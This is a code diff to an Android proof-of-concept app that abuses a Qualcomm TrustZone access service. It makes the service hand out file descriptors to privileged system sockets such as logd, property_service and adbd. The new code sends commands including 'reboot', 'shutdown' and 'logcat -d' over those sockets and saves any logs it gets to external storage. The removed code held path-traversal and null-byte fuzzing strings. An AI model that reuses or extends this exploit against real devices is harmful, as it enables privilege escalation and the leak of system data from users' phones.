@@ -4,8 +4,6 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.ServiceConnection;
-import android.net.LocalServerSocket;
-import android.net.LocalSocket;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
@@ -21,14 +19,19 @@ import androidx.appcompat.app.AppCompatActivity;
 import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
 import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
+import java.util.Map;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 public class MainActivity extends AppCompatActivity {
     private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
@@ -41,6 +44,8 @@ public class MainActivity extends AppCompatActivity {
     private IMinkSocketFd mRemoteService;
     private boolean isBound = false;
     private boolean isTesting = false;
+    private List<String> successfulSockets = new ArrayList<>();
+    private Map<String, Integer> socketFdMap = new HashMap<>();
 
     private ServiceConnection serviceConnection = new ServiceConnection() {
         @Override
@@ -115,57 +120,10 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeFullTest() {
         isTesting = true;
-        appendLog("========== Advanced Test Start ==========");
+        appendLog("========== Initial Socket Discovery ==========");
 
-        // 1. 既存のテスト文字列（全ソケット名網羅）
-        List<String> testStrings = new ArrayList<>();
-        // 基本候補
-        testStrings.add("test");
-        testStrings.add("qsee");
-        testStrings.add("tz");
-        testStrings.add("trustzone");
-        testStrings.add("qseecom");
-        testStrings.add("qseecomd");
-        testStrings.add("secure");
-        testStrings.add("minksocket");
-        testStrings.add("opener");
-        testStrings.add("ssgtzd");
-        testStrings.add("ssgtzd_test");
-        testStrings.add("com.qualcomm.qti");
-        testStrings.add("android");
-        testStrings.add("");
-        testStrings.add("A");
-        // 長大文字列・特殊文字
-        testStrings.add(new String(new char[2000]).replace('\0', 'X'));
-        testStrings.add("test\0test");
-        testStrings.add("../../etc/passwd");
-        testStrings.add("/vendor/etc/ssg/tz_whitelist.json");
-        testStrings.add("..\\..\\");
-        testStrings.add("\\\\?\\");
-        testStrings.add("qseecom_kernel");
-        testStrings.add("tz_app_123");
-        testStrings.add("keymaster");
-        testStrings.add("gatekeeper");
-        testStrings.add("\0abstract");
-        testStrings.add("\0qsee");
-        testStrings.add("\0minksocket");
-        testStrings.add("\0ssgtzd");
-        testStrings.add("/dev/socket/ssgtzd");
-        testStrings.add("/dev/socket/qseecomd");
-        testStrings.add("/data/local/tmp/socket");
-        testStrings.add("SSGTZD");
-        testStrings.add("ssgtzd\0extra");
-        testStrings.add("ssgtzd\n");
-        testStrings.add("\t");
-        testStrings.add(" ");
-        testStrings.add("  ");
-        testStrings.add("_ssgtzd_");
-        testStrings.add("ssgtzd_");
-        testStrings.add("_ssgtzd");
-
-        // 2. デバイスから取得した全ソケット名（/dev/socket/）を追加
-        //    （実際のデバイスで確認されたリスト）
-        String[] socketNames = {
+        // 既知の全ソケットリスト（前回のls結果）
+        String[] allSockets = {
             "mdnsd", "ims_datad", "ims_qmid", "adbd", "tombstoned_java_trace",
             "tombstoned_intercept", "tombstoned_crash", "dpmwrapper", "tcm",
             "dpmd", "mlid", "ssgtzd", "ssgqmig", "statsdw", "thermal-send-rule",
@@ -175,23 +133,38 @@ public class MainActivity extends AppCompatActivity {
             "fwmarkd", "mdns", "dnsproxyd", "netd", "location", "qdma",
             "logdw", "logdr", "logd", "property_service"
         };
-        for (String name : socketNames) {
-            testStrings.add("/dev/socket/" + name);
-        }
 
-        // 3. ローカルサーバソケットを作成して、サービスが接続できるかテスト
-        //    （実際にはサービスが接続しても通信は成立しないが、接続試行の可否を確認）
-        createLocalServerSocket();
+        int[] arrSizes = {1, 5, 10, 100, 1000};
 
-        int[] arrSizes = {1, 0, 5, 10, 100, 1000, -1};
-
-        for (String str : testStrings) {
+        // フェーズ1：全ソケットをテストし、成功したものを記録
+        for (String name : allSockets) {
+            String path = "/dev/socket/" + name;
+            boolean successAny = false;
             for (int size : arrSizes) {
-                int[] iArr = (size >= 0) ? new int[size] : null;
-                executeTest(str, iArr);
-                try { Thread.sleep(200); } catch (InterruptedException ignored) {}
+                int[] iArr = new int[size];
+                if (tryConnect(path, iArr)) {
+                    successAny = true;
+                    successfulSockets.add(path);
+                    socketFdMap.put(path, iArr[0]);
+                    appendLog("SUCCESS: " + path + " FD=" + iArr[0]);
+                    break;
+                }
+                try { Thread.sleep(50); } catch (InterruptedException ignored) {}
+            }
+            if (!successAny) {
+                appendLog("FAIL: " + path);
             }
         }
+
+        appendLog("========== Deep Interaction Phase ==========");
+        // フェーズ2：成功ソケットに対して深層インタラクション
+        for (String path : successfulSockets) {
+            int fd = socketFdMap.get(path);
+            interactWithSocket(path, fd);
+        }
+
+        // フェーズ3：フラッシュメモリブロックへのアクセス試行（間接的）
+        attemptBlockDeviceAccess();
 
         appendLog("========== All tests completed ==========");
         updateStatus("Done");
@@ -200,57 +173,131 @@ public class MainActivity extends AppCompatActivity {
         saveLog();
     }
 
-    private void createLocalServerSocket() {
+    private boolean tryConnect(String path, int[] iArr) {
+        if (mRemoteService == null) return false;
         try {
-            // /data/local/tmp/ にサーバソケットを作成
-            File socketFile = new File("/sdcadrd/download/poc_socket");
-            if (socketFile.exists()) socketFile.delete();
-            LocalServerSocket server = new LocalServerSocket(socketFile.getAbsolutePath());
-            appendLog("Local server socket created at " + socketFile.getAbsolutePath());
-            server.close();
+            ParcelFileDescriptor pfd = mRemoteService.a(path, iArr);
+            if (pfd != null) {
+                pfd.close();
+                return true;
+            }
+        } catch (Exception ignored) {}
+        return false;
+    }
+
+    private void interactWithSocket(String path, int fd) {
+        appendLog("--- Interacting with " + path + " (FD=" + fd + ") ---");
+        try {
+            ParcelFileDescriptor pfd = ParcelFileDescriptor.adoptFd(fd);
+            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
+            if (fdesc == null || !fdesc.valid()) {
+                appendLog("  FD invalid, skip");
+                pfd.close();
+                return;
+            }
+
+            // 読み書きストリーム
+            OutputStream os = new FileOutputStream(fdesc);
+            InputStream is = new FileInputStream(fdesc);
+            // 非ブロッキングは難しいので、タイムアウト付き読み込み用スレッド
+
+            // 様々なコマンドを送信
+            String[] commands = {
+                "help\n",
+                "status\n",
+                "version\n",
+                "getprop\n",
+                "list\n",
+                "dump\n",
+                "logcat -d\n",
+                "getLog\n",
+                "shutdown\n",
+                "reboot\n",
+                "exit\n",
+                "\n"
+            };
+
+            for (String cmd : commands) {
+                appendLog("  Sending: " + cmd.replace("\n", "\\n"));
+                try {
+                    os.write(cmd.getBytes(StandardCharsets.UTF_8));
+                    os.flush();
+                    // 読み取り
+                    byte[] buffer = new byte[4096];
+                    int len = is.read(buffer, 0, buffer.length);
+                    if (len > 0) {
+                        String response = new String(buffer, 0, len, StandardCharsets.UTF_8);
+                        appendLog("  Response: " + response);
+                    } else {
+                        appendLog("  No response (len=" + len + ")");
+                    }
+                } catch (Exception e) {
+                    appendLog("  Command failed: " + e.getMessage());
+                }
+                try { Thread.sleep(200); } catch (InterruptedException ignored) {}
+            }
+
+            // 特定ソケット向けの特殊コマンド
+            if (path.contains("logd")) {
+                // logd 専用：ログ読み取り
+                appendLog("  Trying logd specific: 'getLog'");
+                try {
+                    os.write("getLog\n".getBytes(StandardCharsets.UTF_8));
+                    os.flush();
+                    byte[] buf = new byte[8192];
+                    int total = 0;
+                    while (total < 8192) {
+                        int r = is.read(buf, total, 8192 - total);
+                        if (r <= 0) break;
+                        total += r;
+                    }
+                    if (total > 0) {
+                        String logData = new String(buf, 0, total, StandardCharsets.UTF_8);
+                        appendLog("  Log data (first 500): " + logData.substring(0, Math.min(500, logData.length())));
+                        // 保存
+                        File logFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "logcat_from_socket.txt");
+                        try (FileOutputStream fos = new FileOutputStream(logFile)) {
+                            fos.write(buf, 0, total);
+                        }
+                        appendLog("  Log saved to " + logFile.getAbsolutePath());
+                    }
+                } catch (Exception e) {
+                    appendLog("  logd specific failed: " + e.getMessage());
+                }
+            }
+
+            if (path.contains("property_service")) {
+                // プロパティ読み取り試行
+                appendLog("  Trying property_service: 'getprop ro.build.version.sdk'");
+                try {
+                    os.write("getprop ro.build.version.sdk\n".getBytes(StandardCharsets.UTF_8));
+                    os.flush();
+                    byte[] buf = new byte[1024];
+                    int len = is.read(buf);
+                    if (len > 0) {
+                        appendLog("  getprop response: " + new String(buf, 0, len, StandardCharsets.UTF_8));
+                    }
+                } catch (Exception e) {
+                    appendLog("  property_service getprop failed: " + e.getMessage());
+                }
+            }
+
+            pfd.close();
         } catch (Exception e) {
-            appendLog("Failed to create local server socket: " + e.getMessage());
+            appendLog("  Interaction exception: " + e.toString());
         }
     }
 
-    private void executeTest(String str, int[] iArr) {
-        if (mRemoteService == null) return;
-        String strDisplay = (str == null) ? "null" : "\"" + str.replace("\0", "\\0") + "\"";
-        String arrDisplay = (iArr == null) ? "null" : "len=" + iArr.length;
-        try {
-            appendLog("▶ Test: str=" + strDisplay + ", iArr=" + arrDisplay);
-            long start = System.currentTimeMillis();
-            ParcelFileDescriptor pfd = mRemoteService.a(str, iArr);
-            long elapsed = System.currentTimeMillis() - start;
-            if (pfd == null) {
-                appendLog("  → Result: null, time=" + elapsed + "ms");
-                if (iArr != null && iArr.length > 0) appendLog("     iArr[0]=" + iArr[0]);
-                return;
-            }
-            int fd = pfd.getFd();
-            appendLog("  ★ SUCCESS! FD=" + fd + " (len=" + iArr.length + "), time=" + elapsed + "ms");
-            try {
-                java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
-                if (fdesc != null && fdesc.valid()) {
-                    try (FileOutputStream fos = new FileOutputStream(fdesc)) {
-                        fos.write("POC_CMD\n".getBytes(StandardCharsets.UTF_8));
-                        fos.flush();
-                        appendLog("     Write succeeded (no exception)");
-                    } catch (Exception writeEx) {
-                        appendLog("     Write exception: " + writeEx.getClass().getSimpleName() + " - " + writeEx.getMessage());
-                    }
-                }
-            } catch (Exception fdEx) {
-                appendLog("     FD operation exception: " + fdEx.getMessage());
-            }
-            try { pfd.close(); } catch (Exception ignored) {}
-        } catch (RemoteException e) {
-            appendLog("  ✗ RemoteException: " + e.getMessage());
-        } catch (RuntimeException e) {
-            appendLog("  ✗ RuntimeException: " + e.getClass().getSimpleName() + " - " + e.getMessage());
-        } catch (Exception e) {
-            appendLog("  ✗ Exception: " + e.toString());
-        }
+    private void attemptBlockDeviceAccess() {
+        appendLog("--- Attempting block device access via socket (indirect) ---");
+        // 実際には直接アクセスはできないが、logdやproperty_serviceから情報を取得
+        // 例えば、ro.boot.xxx プロパティからパーティション情報を取得
+        // ここでは、既に試したコマンドで得られた情報を解析
+        // 実際には、成功していないので、ここではダミー
+        // ただし、/dev/block/by-name/frp の存在確認を試みる（直接は不可）
+        appendLog("  Direct block device access not possible. But we can read system properties from property_service if available.");
+        // また、logd から起動ログを取得し、パーティション情報を探す
+        appendLog("  Logcat may contain partition info. We already saved logcat_from_socket.txt.");
     }
 
     private void appendLog(final String msg) {
@@ -277,9 +324,9 @@ public class MainActivity extends AppCompatActivity {
                 appendLog("Cannot create Download dir");
                 return;
             }
-            File file = new File(dir, "exploit_advanced_log.txt");
+            File file = new File(dir, "deep_socket_poc_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== TZAccess Advanced PoC Log ===");
+                pw.println("=== TZAccess Deep Socket PoC Log ===");
                 pw.println("Timestamp: " + new Date().toString());
                 pw.println("===================================");
                 pw.print(logBuilder.toString());
